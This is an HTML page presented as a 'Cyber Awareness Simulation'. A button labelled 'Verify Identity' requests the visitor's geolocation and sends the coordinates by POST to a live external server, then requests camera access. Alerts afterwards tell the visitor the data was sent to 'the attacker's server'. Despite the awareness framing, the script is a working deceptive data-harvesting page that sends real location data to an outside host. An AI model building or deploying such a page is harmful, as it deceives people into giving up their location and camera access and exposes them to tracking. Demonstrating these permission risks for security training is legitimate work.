<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cyber Awareness Simulation</title>
    <style>
        body { font-family: sans-serif; text-align: center; margin-top: 100px; }
        button { padding: 20px 40px; font-size: 20px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 5px; }
        button:hover { background-color: #0056b3; }
    </style>
</head>
<body>

    <h1>Security Awareness Simulation</h1>
    <p>Click the button below to see how browser permissions can be abused.</p>
    
    <button id="demoBtn">Verify Identity</button>

    <script>
        // Your live server address
        const SERVER_URL = "https://adishakti.pythonanywhere.com/send-data";

        document.getElementById('demoBtn').onclick = async () => {
            // 1. Request Location Permission
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const payload = { 
                        lat: pos.coords.latitude, 
                        lon: pos.coords.longitude 
                    };

                    // Send data to your PythonAnywhere server
                    try {
                        const response = await fetch(SERVER_URL, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify(payload)
                        });
                        alert("Permission granted! Data has been exfiltrated to the attacker's server.");
                    } catch (error) {
                        console.error("Error sending data:", error);
                    }
                }, (err) => {
                    alert("Location access denied by user.");
                });
            }

            // 2. Request Camera Permission
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                // If we get here, the user allowed the camera
                alert("Camera permission granted! In a real attack, your photo would be captured now.");
                stream.getTracks().forEach(track => track.stop()); // Stop the camera immediately
            } catch (err) {
                alert("Camera access denied by user.");
            }
        };
    </script>
</body>
</html>
